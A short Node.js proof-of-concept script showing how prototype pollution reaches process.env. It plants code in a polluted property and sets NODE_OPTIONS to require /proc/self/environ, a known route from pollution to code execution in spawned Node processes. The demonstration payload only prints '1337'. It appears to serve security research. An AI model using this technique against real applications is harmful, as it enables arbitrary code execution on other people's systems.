obj = {};

console.log(process.env.__proto__.__proto__ === obj.__proto__); // true

obj.__proto__.AAA = 'a'; // pollution

console.log(obj.AAA) // 'a'
console.log(process.env.AAA) // 'a'

obj.__proto__.AAA = 'console.log("1337")//';
obj.__proto__.NODE_OPTIONS = "--require /proc/self/environ";

console.log(process.env.AAA) // 'console.log("1337")//'
console.log(process.env.NODE_OPTIONS) // '--require /proc/self/environ'

console.log(process.AAA) // 'console.log("1337")//'
console.log(process.NODE_OPTIONS) // '--require /proc/self/environ'